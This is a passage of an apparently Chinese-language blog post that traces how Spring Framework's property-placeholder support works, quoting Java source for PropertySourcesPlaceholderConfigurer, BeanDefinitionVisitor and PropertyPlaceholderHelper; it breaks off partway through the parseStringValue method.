class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> BeanDefinition <span class="title">parse</span><span class="params">(Element element, ParserContext parserContext)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findParserForElement(element, parserContext).parse(element, parserContext);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Locates the &#123;<span class="doctag">@link</span> BeanDefinitionParser&#125; from the register implementations using</span></span><br><span class="line"><span class="comment">	 * the local name of the supplied &#123;<span class="doctag">@link</span> Element&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> BeanDefinitionParser <span class="title">findParserForElement</span><span class="params">(Element element, ParserContext parserContext)</span> </span>&#123;</span><br><span class="line">		String localName = parserContext.getDelegate().getLocalName(element);</span><br><span class="line">		BeanDefinitionParser parser = <span class="keyword">this</span>.parsers.get(localName);</span><br><span class="line">		<span class="keyword">if</span> (parser == <span class="keyword">null</span>) &#123;</span><br><span class="line">			parserContext.getReaderContext().fatal(</span><br><span class="line">					<span class="string">"Cannot locate BeanDefinitionParser for element ["</span> + localName + <span class="string">"]"</span>, element);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> parser;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>就是从在<code>init()</code>方法中注册的<code>Parser</code>,根据对应的标签前缀，获取到parser，对xml元素进行解析。</p>
<h2 id="生效过程"><a href="#生效过程" class="headerlink" title="生效过程"></a>生效过程</h2><p>生效过程是在<code>BeanFactoryPostProcessor</code>被调用的过程中生效的, 继承关系</p>
<img src="/2016/10/31/property-placeholder/post-processors.jpg">
<p>可以看到里面有两个熟悉的类——<code>PropertySourcesPlaceholderConfigurer</code>和<code>PropertyPlaceholderConfigurer</code>，正是<code>PropertyPlaceholderBeanDefinitionParser.getBeanClass</code>返回的两种类型, 也就是说他们两个是<code>BeanFactoryPostProcessor</code>.</p>
<h3 id="PropertySourcesPlaceholderConfigurer"><a href="#PropertySourcesPlaceholderConfigurer" class="headerlink" title="PropertySourcesPlaceholderConfigurer"></a>PropertySourcesPlaceholderConfigurer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Processing occurs by replacing $&#123;...&#125; placeholders in bean definitions by resolving each</span></span><br><span class="line"><span class="comment">	 * against this configurer's set of &#123;<span class="doctag">@link</span> PropertySources&#125;, which includes:</span></span><br><span class="line"><span class="comment">	 * &lt;ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;all &#123;<span class="doctag">@linkplain</span> org.springframework.core.env.ConfigurableEnvironment#getPropertySources</span></span><br><span class="line"><span class="comment">	 * environment property sources&#125;, if an &#123;<span class="doctag">@code</span> Environment&#125; &#123;<span class="doctag">@linkplain</span> #setEnvironment is present&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;&#123;<span class="doctag">@linkplain</span> #mergeProperties merged local properties&#125;, if &#123;<span class="doctag">@linkplain</span> #setLocation any&#125;</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@linkplain</span> #setLocations have&#125; &#123;<span class="doctag">@linkplain</span> #setProperties been&#125;</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@linkplain</span> #setPropertiesArray specified&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;any property sources set by calling &#123;<span class="doctag">@link</span> #setPropertySources&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;If &#123;<span class="doctag">@link</span> #setPropertySources&#125; is called, &lt;strong&gt;environment and local properties will be</span></span><br><span class="line"><span class="comment">	 * ignored&lt;/strong&gt;. This method is designed to give the user fine-grained control over property</span></span><br><span class="line"><span class="comment">	 * sources, and once set, the configurer makes no assumptions about adding additional sources.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postProcessBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.propertySources == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.propertySources = <span class="keyword">new</span> MutablePropertySources();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.environment != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">this</span>.propertySources.addLast(</span><br><span class="line">					<span class="keyword">new</span> PropertySource&lt;Environment&gt;(ENVIRONMENT_PROPERTIES_PROPERTY_SOURCE_NAME, <span class="keyword">this</span>.environment) &#123;</span><br><span class="line">						<span class="meta">@Override</span></span><br><span class="line">						<span class="function"><span class="keyword">public</span> String <span class="title">getProperty</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">							<span class="keyword">return</span> <span class="keyword">this</span>.source.getProperty(key);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				PropertySource&lt;?&gt; localPropertySource =</span><br><span class="line">						<span class="keyword">new</span> PropertiesPropertySource(LOCAL_PROPERTIES_PROPERTY_SOURCE_NAME, mergeProperties());</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">this</span>.localOverride) &#123;</span><br><span class="line">					<span class="keyword">this</span>.propertySources.addFirst(localPropertySource);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">this</span>.propertySources.addLast(localPropertySource);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanInitializationException(<span class="string">"Could not load properties"</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		processProperties(beanFactory, <span class="keyword">new</span> PropertySourcesPropertyResolver(<span class="keyword">this</span>.propertySources));</span><br><span class="line">		<span class="keyword">this</span>.appliedPropertySources = <span class="keyword">this</span>.propertySources;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>注意上述的<code>localOverride</code>变量，它决定了是否用本地的替换系统的，主要是用加载的顺序呢控制的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* &lt;p&gt;Any local properties (e.g. those added via &#123;<span class="doctag">@link</span> #setProperties&#125;, &#123;<span class="doctag">@link</span> #setLocations&#125;</span></span><br><span class="line"><span class="comment">* et al.) are added as a &#123;<span class="doctag">@code</span> PropertySource&#125;. Search precedence of local properties is</span></span><br><span class="line"><span class="comment">* based on the value of the &#123;<span class="doctag">@link</span> #setLocalOverride localOverride&#125; property, which is by</span></span><br><span class="line"><span class="comment">* default &#123;<span class="doctag">@code</span> false&#125; meaning that local properties are to be searched last, after all</span></span><br><span class="line"><span class="comment">* environment property sources.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>获取到所有的属性列表后，处理属性就交给了<code>processProperties</code>这个方法.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Visit each bean definition in the given bean factory and attempt to replace $&#123;...&#125; property</span></span><br><span class="line"><span class="comment">	 * placeholders with values from the given properties.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processProperties</span><span class="params">(ConfigurableListableBeanFactory beanFactoryToProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">final</span> ConfigurablePropertyResolver propertyResolver)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line"></span><br><span class="line">		propertyResolver.setPlaceholderPrefix(<span class="keyword">this</span>.placeholderPrefix);</span><br><span class="line">		propertyResolver.setPlaceholderSuffix(<span class="keyword">this</span>.placeholderSuffix);</span><br><span class="line">		propertyResolver.setValueSeparator(<span class="keyword">this</span>.valueSeparator);</span><br><span class="line"></span><br><span class="line">		StringValueResolver valueResolver = <span class="keyword">new</span> StringValueResolver() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> String <span class="title">resolveStringValue</span><span class="params">(String strVal)</span> </span>&#123;</span><br><span class="line">				String resolved = ignoreUnresolvablePlaceholders ?</span><br><span class="line">						propertyResolver.resolvePlaceholders(strVal) :</span><br><span class="line">						propertyResolver.resolveRequiredPlaceholders(strVal);</span><br><span class="line">				<span class="keyword">return</span> (resolved.equals(nullValue) ? <span class="keyword">null</span> : resolved);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		doProcessProperties(beanFactoryToProcess, valueResolver);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>先设置propertyResolver的prefix（默认是${}）和suffix(默认是})，以及默认值得分隔符(默认是:).</p>
<p>然后创建了一个StringValueResolver, 这里根据<code>ignoreUnresolvablePlaceholders</code>的值来进行不同的解析，</p>
<p>这个值默认是false, 但是可以在标签中配置。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"ignore-unresolvable"</span> <span class="attr">type</span>=<span class="string">"xsd:boolean"</span> <span class="attr">default</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">xsd:annotation</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">xsd:documentation</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">	Specifies if failure to find the property value to replace a key should be ignored.</span><br><span class="line">	Default is "false", meaning that this placeholder configurer will raise an exception</span><br><span class="line">	if it cannot resolve a key. Set to "true" to allow the configurer to pass on the key</span><br><span class="line">	to any others in the context that have not yet visited the key in question.</span><br><span class="line">				]]&gt;<span class="tag">&lt;/<span class="name">xsd:documentation</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">xsd:annotation</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">xsd:attribute</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>false</code>就以为者遇到无法解析的值就会直接抛出异常</p>
<p>接下来看看<code>doProcessProperties</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doProcessProperties</span><span class="params">(ConfigurableListableBeanFactory beanFactoryToProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">		StringValueResolver valueResolver)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	BeanDefinitionVisitor visitor = <span class="keyword">new</span> BeanDefinitionVisitor(valueResolver);</span><br><span class="line"></span><br><span class="line">	String[] beanNames = beanFactoryToProcess.getBeanDefinitionNames();</span><br><span class="line">	<span class="keyword">for</span> (String curName : beanNames) &#123;</span><br><span class="line">		<span class="comment">// Check that we're not parsing our own bean definition,</span></span><br><span class="line">		<span class="comment">// to avoid failing on unresolvable placeholders in properties file locations.</span></span><br><span class="line">		<span class="keyword">if</span> (!(curName.equals(<span class="keyword">this</span>.beanName) &amp;&amp; beanFactoryToProcess.equals(<span class="keyword">this</span>.beanFactory))) &#123;</span><br><span class="line">			BeanDefinition bd = beanFactoryToProcess.getBeanDefinition(curName);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				visitor.visitBeanDefinition(bd);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(bd.getResourceDescription(), curName, ex.getMessage(), ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// New in Spring 2.5: resolve placeholders in alias target names and aliases as well.</span></span><br><span class="line">	beanFactoryToProcess.resolveAliases(valueResolver);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// New in Spring 3.0: resolve placeholders in embedded values such as annotation attributes.</span></span><br><span class="line">	beanFactoryToProcess.addEmbeddedValueResolver(valueResolver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里采用的是visitor模式，查看<code>BeanDefinitionVisitor#visitBeanDefinition</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Traverse the given BeanDefinition object and the MutablePropertyValues</span></span><br><span class="line"><span class="comment">	 * and ConstructorArgumentValues contained in them.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> beanDefinition the BeanDefinition object to traverse</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #resolveStringValue(String)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitBeanDefinition</span><span class="params">(BeanDefinition beanDefinition)</span> </span>&#123;</span><br><span class="line">		visitParentName(beanDefinition);</span><br><span class="line">		visitBeanClassName(beanDefinition);</span><br><span class="line">		visitFactoryBeanName(beanDefinition);</span><br><span class="line">		visitFactoryMethodName(beanDefinition);</span><br><span class="line">		visitScope(beanDefinition);</span><br><span class="line">		visitPropertyValues(beanDefinition.getPropertyValues());</span><br><span class="line">		ConstructorArgumentValues cas = beanDefinition.getConstructorArgumentValues();</span><br><span class="line">		visitIndexedArgumentValues(cas.getIndexedArgumentValues());</span><br><span class="line">		visitGenericArgumentValues(cas.getGenericArgumentValues());</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>以其中的<code>visitParentName</code>为例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">visitParentName</span><span class="params">(BeanDefinition beanDefinition)</span> </span>&#123;</span><br><span class="line">	String parentName = beanDefinition.getParentName();</span><br><span class="line">	<span class="keyword">if</span> (parentName != <span class="keyword">null</span>) &#123;</span><br><span class="line">		String resolvedName = resolveStringValue(parentName);</span><br><span class="line">		<span class="keyword">if</span> (!parentName.equals(resolvedName)) &#123;</span><br><span class="line">			beanDefinition.setParentName(resolvedName);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>就是先获取<code>parentName</code>，然后替换相应的属性之后的<code>resolvedName</code>,如果和原来的不一样就设置<code>resolvedName</code></p>
<p>为新的parentName</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Resolve the given String value, for example parsing placeholders.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> strVal the original String value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the resolved String value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">resolveStringValue</span><span class="params">(String strVal)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.valueResolver == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"No StringValueResolver specified - pass a resolver "</span> +</span><br><span class="line">				<span class="string">"object into the constructor or override the 'resolveStringValue' method"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	String resolvedValue = <span class="keyword">this</span>.valueResolver.resolveStringValue(strVal);</span><br><span class="line">	<span class="comment">// Return original String if not modified.</span></span><br><span class="line">	<span class="keyword">return</span> (strVal.equals(resolvedValue) ? strVal : resolvedValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺藤摸瓜,看看<code>valueResolver</code>,就是之前的<code>StringValueResolver</code></p>
<p>这是一个接口只有一个方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StringValueResolver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Resolve the given String value, for example parsing placeholders.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> strVal the original String value</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the resolved String value</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">String <span class="title">resolveStringValue</span><span class="params">(String strVal)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之前传入的其实就是对应<code>ConfigurablePropertyResolver</code>的两个方法, 之前传入的是它的子类</p>
<p><code>PropertySourcesPropertyResolver</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholders</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.nonStrictHelper == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.nonStrictHelper = createPlaceholderHelper(<span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> doResolvePlaceholders(text, <span class="keyword">this</span>.nonStrictHelper);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">resolveRequiredPlaceholders</span><span class="params">(String text)</span> <span class="keyword">throws</span> IllegalArgumentException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.strictHelper == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.strictHelper = createPlaceholderHelper(<span class="keyword">false</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> doResolvePlaceholders(text, <span class="keyword">this</span>.strictHelper);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>调用的是内部方法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">doResolvePlaceholders</span><span class="params">(String text, PropertyPlaceholderHelper helper)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> helper.replacePlaceholders(text, <span class="keyword">new</span> PropertyPlaceholderHelper.PlaceholderResolver() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String placeholderName)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> getPropertyAsRawString(placeholderName);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终调用功能的是<code>PropertyPlaceholderHelper</code>的replacePlaceholders方法，</p>
<p>这个helper在构造是通过 <code>createPlaceholderHelper</code>方法构建的，他接受一个bool类型的参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> PropertyPlaceholderHelper <span class="title">createPlaceholderHelper</span><span class="params">(<span class="keyword">boolean</span> ignoreUnresolvablePlaceholders)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> PropertyPlaceholderHelper(<span class="keyword">this</span>.placeholderPrefix, <span class="keyword">this</span>.placeholderSuffix,</span><br><span class="line">			<span class="keyword">this</span>.valueSeparator, ignoreUnresolvablePlaceholders);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个bool值就是表示是否要ignore掉不能解析的属性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Creates a new &#123;<span class="doctag">@code</span> PropertyPlaceholderHelper&#125; that uses the supplied prefix and suffix.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> placeholderPrefix the prefix that denotes the start of a placeholder</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> placeholderSuffix the suffix that denotes the end of a placeholder</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> valueSeparator the separating character between the placeholder variable</span></span><br><span class="line"><span class="comment">	 * and the associated default value, if any</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> ignoreUnresolvablePlaceholders indicates whether unresolvable placeholders should</span></span><br><span class="line"><span class="comment">	 * be ignored (&#123;<span class="doctag">@code</span> true&#125;) or cause an exception (&#123;<span class="doctag">@code</span> false&#125;)</span></span><br><span class="line"><span class="comment">	 */</span></span><br></pre></td></tr></table></figure>
<p>接着追</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces all placeholders of format &#123;<span class="doctag">@code</span> $&#123;name&#125;&#125; with the value returned</span></span><br><span class="line"><span class="comment"> * from the supplied &#123;<span class="doctag">@link</span> PlaceholderResolver&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value containing the placeholders to be replaced</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> placeholderResolver the &#123;<span class="doctag">@code</span> PlaceholderResolver&#125; to use for replacement</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the supplied value with placeholders replaced inline</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replacePlaceholders</span><span class="params">(String value, PlaceholderResolver placeholderResolver)</span> </span>&#123;</span><br><span class="line">	Assert.notNull(value, <span class="string">"'value' must not be null"</span>);</span><br><span class="line">	<span class="keyword">return</span> parseStringValue(value, placeholderResolver, <span class="keyword">new</span> HashSet&lt;String&gt;());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">parseStringValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			String strVal, PlaceholderResolver placeholderResolver, Set&lt;String&gt; visitedPlaceholders)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		StringBuilder result = <span class="keyword">new</span> StringBuilder(strVal);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> startIndex = strVal.indexOf(<span class="keyword">this</span>.placeholderPrefix);</span><br><span class="line">		<span class="keyword">while</span> (startIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> endIndex = findPlaceholderEndIndex(result, startIndex);</span><br><span class="line">			<span class="keyword">if</span> (endIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">				String placeholder = result.substring(startIndex + <span class="keyword">this</span>.placeholderPrefix.length(), endIndex);</span><br><span class="line">				String originalPlaceholder = placeholder;</span><br><span class="line">				<span class="keyword">if</span> (!visitedPlaceholders.add(originalPlaceholder)) 